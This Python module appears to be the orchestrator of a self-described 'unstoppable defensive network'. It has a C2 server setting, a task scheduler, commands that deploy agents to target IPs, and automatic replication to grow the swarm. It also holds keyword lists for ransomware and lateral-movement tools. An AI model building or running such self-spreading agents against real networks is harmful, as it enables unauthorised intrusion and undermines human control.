"""
SERVERROOT.NET - SWARM ORCHESTRATION ENGINE

The brain of the unstoppable defensive network.
Coordinates all agents, manages intelligence, directs operations.

CAPABILITIES:
- Global command and control
- Distributed task allocation
- Swarm intelligence analysis
- Automatic threat prioritization
- Real-time swarm coordination
"""

import asyncio
import threading
import time
import uuid
import json
from typing import Dict, List, Optional, Any
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from enum import Enum
from collections import deque, defaultdict
import heapq


class TaskPriority(Enum):
    """Task priority levels"""
    CRITICAL = 0  # Immediate execution
    HIGH = 1      # High priority
    MEDIUM = 2    # Normal priority
    LOW = 3       # Background tasks


class TaskType(Enum):
    """Task types for swarm operations"""
    SCAN = "scan"
    DEFEND = "defend"
    REPLICATE = "replicate"
    ANALYZE = "analyze"
    REPORT = "report"
    RECOVER = "recover"


@dataclass(order=True)
class SwarmTask:
    """Swarm task with priority"""
    priority: int = field(compare=True)
    task_type: TaskType = field(compare=False)
    task_id: str = field(compare=False, default_factory=lambda: str(uuid.uuid4()))
    created_at: datetime = field(compare=False, default_factory=datetime.now)
    assigned_agent: Optional[str] = field(default=None)
    target: Optional[Dict] = None
    data: Dict = field(default_factory=dict)
    
    def __post_init__(self):
        """Set priority from enum"""
        if isinstance(self.priority, TaskPriority):
            self.priority = self.priority.value


class SwarmIntelligence:
    """
    SWARM INTELLIGENCE ENGINE
    
    Collects, analyzes, and distributes intelligence across the swarm
    """
    
    def __init__(self):
        self.threat_database: Dict[str, Dict] = {}
        self.vulnerability_cache: Dict[str, List[Dict]] = {}
        self.network_topology: Dict[str, List[str]] = {}  # IP -> neighbors
        self.agent_performance: Dict[str, Dict] = {}
        self.success_patterns: List[Dict] = []
        self.lock = threading.Lock()
    
    def analyze_threat(self, threat_data: Dict) -> Dict:
        """Analyze a threat and provide intelligence"""
        threat_id = threat_data.get("id") or str(uuid.uuid4())
        
        analysis = {
            "threat_id": threat_id,
            "severity": self._calculate_severity(threat_data),
            "propagation_risk": self._assess_propagation_risk(threat_data),
            "recommended_action": self._recommend_action(threat_data),
            "similar_threats": self._find_similar_threats(threat_data),
            "analyzed_at": datetime.now().isoformat()
        }
        
        with self.lock:
            self.threat_database[threat_id] = analysis
        
        return analysis
    
    def _calculate_severity(self, threat_data: Dict) -> str:
        """Calculate threat severity"""
        severity_score = 0
        
        # CVE severity
        for vuln in threat_data.get("vulnerabilities", []):
            cve_id = vuln.get("cve_id", "")
            if "CRITICAL" in str(vuln.get("severity", "")):
                severity_score += 10
            elif "HIGH" in str(vuln.get("severity", "")):
                severity_score += 5
            elif "MEDIUM" in str(vuln.get("severity", "")):
                severity_score += 2
            elif "LOW" in str(vuln.get("severity", "")):
                severity_score += 1
        
        # Number of vulnerabilities
        vuln_count = len(threat_data.get("vulnerabilities", []))
        severity_score += min(vuln_count, 10)
        
        # Determine severity level
        if severity_score >= 20:
            return "CRITICAL"
        elif severity_score >= 10:
            return "HIGH"
        elif severity_score >= 5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _assess_propagation_risk(self, threat_data: Dict) -> str:
        """Assess risk of threat propagation"""
        # Check for ransomware indicators
        ransomware_indicators = [
            "encryption", "ransom", "bitcoin", "payment", "decrypt",
            "wanna", "locky", "petya", "notpetya", "cerber"
        ]
        
        threat_text = str(threat_data).lower()
        
        for indicator in ransomware_indicators:
            if indicator in threat_text:
                return "CRITICAL"
        
        # Check for lateral movement indicators
        lateral_movement = ["smb", "rdp", "wmi", "ps_exec", "psexec"]
        for movement in lateral_movement:
            if movement in threat_text:
                return "HIGH"
        
        return "MEDIUM"
    
    def _recommend_action(self, threat_data: Dict) -> List[str]:
        """Recommended actions for threat"""
        actions = []
        
        severity = self._calculate_severity(threat_data)
        
        if severity == "CRITICAL":
            actions.extend([
                "IMMEDIATE_NEUTRALIZATION",
                "ISOLATE_SYSTEM",
                "DEPLOY_AGENTS_TO_NEIGHBORS",
                "ALERT_COORDINATOR"
            ])
        elif severity == "HIGH":
            actions.extend([
                "PRIORITY_NEUTRALIZATION",
                "DEPLOY_ADDITIONAL_AGENTS",
                "MONITOR_NEIGHBORS"
            ])
        else:
            actions.extend([
                "SCHEDULED_NEUTRALIZATION",
                "CONTINUOUS_MONITORING"
            ])
        
        return actions
    
    def _find_similar_threats(self, threat_data: Dict) -> List[str]:
        """Find similar threats from database"""
        similar = []
        
        with self.lock:
            for threat_id, threat_info in self.threat_database.items():
                # Matching criteria
                if len(similar) >= 5:
                    break
                
                # Check for similar CVEs
                threat_cves = set(
                    v.get("cve_id", "") 
                    for v in threat_data.get("vulnerabilities", [])
                )
                known_cves = set(
                    v.get("cve_id", "") 
                    for v in threat_info.get("vulnerabilities", [])
                )
                
                if threat_cves & known_cves:
                    similar.append(threat_id)
        
        return similar
    
    def update_network_topology(self, agent_id: str, neighbors: List[str]):
        """Update network topology knowledge"""
        with self.lock:
            for neighbor in neighbors:
                if neighbor not in self.network_topology:
                    self.network_topology[neighbor] = []
                
                if agent_id not in self.network_topology[neighbor]:
                    self.network_topology[neighbor].append(agent_id)
    
    def get_network_graph(self) -> Dict:
        """Get current network topology"""
        with self.lock:
            return dict(self.network_topology)


class DistributedTaskScheduler:
    """
    DISTRIBUTED TASK SCHEDULER
    
    Allocates tasks to agents optimally across the swarm
    """
    
    def __init__(self):
        self.task_queue: List[SwarmTask] = []
        self.queue_lock = threading.Lock()
        self.agent_tasks: Dict[str, List[str]] = defaultdict(list)
        self.task_history: List[Dict] = []
    
    def submit_task(self, 
                   task_type: TaskType, 
                   priority: TaskPriority,
                   target: Optional[Dict] = None,
                   data: Optional[Dict] = None) -> str:
        """Submit task to swarm"""
        task = SwarmTask(
            priority=priority,
            task_type=task_type,
            target=target,
            data=data or {}
        )
        
        with self.queue_lock:
            heapq.heappush(self.task_queue, task)
        
        return task.task_id
    
    def get_next_task(self, agent_id: str) -> Optional[SwarmTask]:
        """Get next task for agent"""
        with self.queue_lock:
            if not self.task_queue:
                return None
            
            task = heapq.heappop(self.task_queue)
            task.assigned_agent = agent_id
            
            self.agent_tasks[agent_id].append(task.task_id)
            
            return task
    
    def get_agent_tasks(self, agent_id: str) -> List[Dict]:
        """Get all tasks for specific agent"""
        with self.queue_lock:
            tasks = [
                {"task_id": tid, "status": "assigned"}
                for tid in self.agent_tasks.get(agent_id, [])
            ]
            return tasks
    
    def complete_task(self, task_id: str, result: Dict):
        """Mark task as complete"""
        with self.queue_lock:
            self.task_history.append({
                "task_id": task_id,
                "completed_at": datetime.now().isoformat(),
                "result": result
            })
            
            # Remove from agent's active tasks
            for agent_id in self.agent_tasks:
                if task_id in self.agent_tasks[agent_id]:
                    self.agent_tasks[agent_id].remove(task_id)


class SwarmOrchestrator:
    """
    SWARM ORCHESTRATOR
    
    The central command and control for the unstoppable defensive network
    """
    
    def __init__(self, 
                 swarm_engine,
                 c2_server: str = "localhost",
                 c2_port: int = 8443):
        """
        Initialize swarm orchestrator
        
        Args:
            swarm_engine: Reference to swarm engine
            c2_server: C2 server address
            c2_port: C2 server port
        """
        self.swarm_engine = swarm_engine
        self.c2_server = c2_server
        self.c2_port = c2_port
        
        # Core components
        self.intelligence = SwarmIntelligence()
        self.scheduler = DistributedTaskScheduler()
        
        # Command and control
        self.global_commands: asyncio.Queue = asyncio.Queue()
        self.command_history: List[Dict] = []
        
        # Swarm coordination
        self.coordination_events: asyncio.Queue = asyncio.Queue()
        self.agent_heartbeats: Dict[str, datetime] = {}
        
        # Statistics
        self.stats = {
            "tasks_created": 0,
            "tasks_completed": 0,
            "threats_analyzed": 0,
            "commands_issued": 0,
            "coordination_events": 0
        }
        
        # Operation flags
        self.running = False
        self.autonomous_coordination = True
        
        print(f"\n{'='*80}")
        print(f"🧠 SWARM ORCHESTRATOR INITIALIZED")
        print(f"{'='*80}")
        print(f"Intelligence Engine: Active")
        print(f"Task Scheduler: Active")
        print(f"Coordination: Autonomous")
        print(f"{'='*80}\n")
    
    async def start(self):
        """Start orchestrator"""
        print(f"\n🚀 Starting Swarm Orchestrator...\n")
        
        self.running = True
        
        # Start coordination loops
        tasks = [
            asyncio.create_task(self._coordination_loop()),
            asyncio.create_task(self._task_dispatch_loop()),
            asyncio.create_task(self._command_processing_loop()),
            asyncio.create_task(self._intelligence_gathering_loop())
        ]
        
        print(f"✅ Orchestrator Online - Swarm intelligence active\n")
        
        # Wait for all tasks
        await asyncio.gather(*tasks)
    
    async def _coordination_loop(self):
        """Main coordination loop"""
        print("🔄 Coordination Loop Started")
        
        while self.running:
            try:
                # Get coordination events
                if not self.coordination_events.empty():
                    event = await self.coordination_events.get()
                    await self._process_coordination_event(event)
                
                # Periodic coordination
                await self._periodic_coordination()
                
                await asyncio.sleep(0.5)
            
            except Exception as e:
                print(f"⚠️  Coordination error: {e}")
                await asyncio.sleep(1)
    
    async def _task_dispatch_loop(self):
        """Task dispatch loop"""
        print("📋 Task Dispatch Loop Started")
        
        while self.running:
            try:
                # Get swarm status
                swarm_status = self.swarm_engine.get_swarm_status()
                
                # Find idle agents
                idle_agents = [
                    agent for agent in swarm_status["agents"]
                    if agent["active"] and agent["state"] == "coordinating"
                ]
                
                # Dispatch tasks to idle agents
                for agent in idle_agents[:5]:  # Dispatch to 5 agents at a time
                    task = self.scheduler.get_next_task(agent["id"])
                    if task:
                        await self._dispatch_task(agent["id"], task)
                
                await asyncio.sleep(1)
            
            except Exception as e:
                print(f"⚠️  Task dispatch error: {e}")
                await asyncio.sleep(1)
    
    async def _command_processing_loop(self):
        """Global command processing loop"""
        print("🎮 Command Processing Loop Started")
        
        while self.running:
            try:
                # Process global commands
                if not self.global_commands.empty():
                    command = await self.global_commands.get()
                    await self._execute_global_command(command)
                
                await asyncio.sleep(0.5)
            
            except Exception as e:
                print(f"⚠️  Command processing error: {e}")
                await asyncio.sleep(1)
    
    async def _intelligence_gathering_loop(self):
        """Intelligence gathering loop"""
        print("🧠 Intelligence Gathering Loop Started")
        
        while self.running:
            try:
                # Gather intelligence from swarm
                await self._gather_swarm_intelligence()
                
                # Analyze threats
                await self._analyze_emerging_threats()
                
                await asyncio.sleep(5)
            
            except Exception as e:
                print(f"⚠️  Intelligence gathering error: {e}")
                await asyncio.sleep(1)
    
    async def _process_coordination_event(self, event: Dict):
        """Process coordination event from agent"""
        event_type = event.get("type")
        agent_id = event.get("agent_id")
        
        print(f"🤝 Coordination: {event_type} from {agent_id}")
        
        if event_type == "target_discovered":
            # Queue scan task for new target
            self.scheduler.submit_task(
                task_type=TaskType.SCAN,
                priority=TaskPriority.MEDIUM,
                target=event.get("target"),
                data={"discovered_by": agent_id}
            )
            self.stats["coordination_events"] += 1
        
        elif event_type == "threat_detected":
            # Analyze threat and queue defense task
            analysis = self.intelligence.analyze_threat(event.get("threat"))
            
            priority = TaskPriority.CRITICAL if analysis["severity"] == "CRITICAL" else TaskPriority.HIGH
            
            self.scheduler.submit_task(
                task_type=TaskType.DEFEND,
                priority=priority,
                target=event.get("target"),
                data={
                    "threat": event.get("threat"),
                    "analysis": analysis
                }
            )
            self.stats["threats_analyzed"] += 1
        
        elif event_type == "scan_complete":
            # Record completion
            self.scheduler.complete_task(event.get("task_id"), event)
            self.stats["tasks_completed"] += 1
    
    async def _dispatch_task(self, agent_id: str, task: SwarmTask):
        """Dispatch task to agent"""
        print(f"📤 Dispatching task to {agent_id}: {task.task_type.value}")
        
        # Send task to agent through swarm engine
        # (In production, this would use IPC or messaging)
        
        self.stats["tasks_created"] += 1
    
    async def _execute_global_command(self, command: Dict):
        """Execute global command"""
        command_type = command.get("type")
        
        print(f"🎮 Executing global command: {command_type}")
        
        if command_type == "deploy_swarm":
            # Deploy swarm to target network
            targets = command.get("targets", [])
            for target in targets:
                self.swarm_engine.deploy_agent(target.get("ip"), target.get("port"))
        
        elif command_type == "scale_swarm":
            # Scale swarm (increase replication)
            self.swarm_engine.replication_factor = command.get("replication_factor", 20)
        
        elif command_type == "emergency_stop":
            # Emergency stop
            self.swarm_engine.stop_swarm()
            self.running = False
        
        self.command_history.append({
            "command": command,
            "executed_at": datetime.now().isoformat()
        })
        self.stats["commands_issued"] += 1
    
    async def _periodic_coordination(self):
        """Periodic swarm-wide coordination"""
        # Update swarm statistics
        swarm_status = self.swarm_engine.get_swarm_status()
        
        # Check for swarm imbalances
        await self._balance_swarm_load(swarm_status)
        
        # Coordinate replication strategy
        await self._coordinate_replication(swarm_status)
        
        # Update heartbeats
        for agent in swarm_status["agents"]:
            if agent["active"]:
                self.agent_heartbeats[agent["id"]] = datetime.now()
    
    async def _balance_swarm_load(self, swarm_status: Dict):
        """Balance workload across swarm"""
        # Find overloaded agents
        overloaded = [
            agent for agent in swarm_status["agents"]
            if agent["vulnerabilities"] > 10  # More than 10 vulnerabilities found
        ]
        
        for agent in overloaded:
            # Create analysis task
            self.scheduler.submit_task(
                task_type=TaskType.ANALYZE,
                priority=TaskPriority.HIGH,
                data={"agent_id": agent["id"], "reason": "high_load"}
            )
    
    async def _coordinate_replication(self, swarm_status: Dict):
        """Coordinate replication across swarm"""
        # Check if swarm is too small
        total_agents = swarm_status["total_agents"]
        
        if total_agents < 100:
            # Submit replication task to coordinator
            self.scheduler.submit_task(
                task_type=TaskType.REPLICATE,
                priority=TaskPriority.HIGH,
                data={"reason": "scale_up", "target_size": 100}
            )
    
    async def _gather_swarm_intelligence(self):
        """Gather intelligence from all agents"""
        swarm_status = self.swarm_engine.get_swarm_status()
        
        for agent in swarm_status["agents"]:
            if agent["vulnerabilities"] > 0:
                # Agent has discovered vulnerabilities
                agent_data = {
                    "agent_id": agent["id"],
                    "ip": agent["ip"],
                    "vulnerabilities": agent["vulnerabilities"],
                    "scanned": agent["scanned"]
                }
                
                self.intelligence.update_network_topology(
                    agent["id"],
                    [agent["ip"]] if agent["ip"] else []
                )
    
    async def _analyze_emerging_threats(self):
        """Analyze emerging threats from intelligence"""
        # Get recent threats
        recent_threats = []
        
        # Analyze patterns
        # (Implementation depends on threat data structure)
        pass
    
    # Public API
    
    def deploy_swarm(self, targets: List[Dict]) -> str:
        """Deploy swarm to target network"""
        command_id = str(uuid.uuid4())
        
        command = {
            "type": "deploy_swarm",
            "targets": targets,
            "command_id": command_id
        }
        
        asyncio.run_coroutine_threadsafe(
            self.global_commands.put(command),
            self.swarm_engine.loop
        )
        
        return command_id
    
    def scale_swarm(self, replication_factor: int) -> str:
        """Scale swarm replication factor"""
        command_id = str(uuid.uuid4())
        
        command = {
            "type": "scale_swarm",
            "replication_factor": replication_factor,
            "command_id": command_id
        }
        
        asyncio.run_coroutine_threadsafe(
            self.global_commands.put(command),
            self.swarm_engine.loop
        )
        
        return command_id
    
    def get_orchestrator_status(self) -> Dict:
        """Get orchestrator status"""
        return {
            "running": self.running,
            "tasks_pending": len(self.scheduler.task_queue),
            "tasks_completed": self.stats["tasks_completed"],
            "threats_analyzed": self.stats["threats_analyzed"],
            "commands_issued": self.stats["commands_issued"],
            "coordination_events": self.stats["coordination_events"],
            "agent_count": len(self.agent_heartbeats),
            "intelligence_database_size": len(self.intelligence.threat_database)
        }
    
    def stop(self):
        """Stop orchestrator"""
        print(f"\n{'='*80}")
        print(f"🛑 STOPPING SWARM ORCHESTRATOR")
        print(f"{'='*80}\n")
        
        self.running = False


# Integration with swarm engine

def create_swarm_orchestrator(swarm_engine) -> SwarmOrchestrator:
    """Create and initialize swarm orchestrator"""
    orchestrator = SwarmOrchestrator(swarm_engine)
    return orchestrator


if __name__ == "__main__":
    print("\n" + "="*80)
    print("SERVERROOT.NET - SWARM ORCHESTRATOR")
    print("="*80)
    print("\nSwarm intelligence and coordination system")
    print("="*80 + "\n")